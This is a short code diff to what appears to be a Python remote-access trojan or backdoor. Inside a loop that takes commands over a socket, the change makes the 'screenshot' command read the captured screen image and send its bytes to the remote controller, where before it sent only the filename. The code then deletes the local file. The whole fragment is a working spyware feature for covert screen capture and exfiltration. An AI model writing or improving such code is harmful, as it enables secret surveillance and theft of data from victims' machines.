@@ -21,5 +21,7 @@ while True:
     elif cmd == 'screenshot':
         screenshot = pyautogui.screenshot()
         screenshot.save('screenshot.png')
-        s.send('screenshot.png'.encode())
+        with open('screenshot.png', 'rb') as f:
+            data = f.read()
+        s.send(data)
         os.remove('screenshot.png')
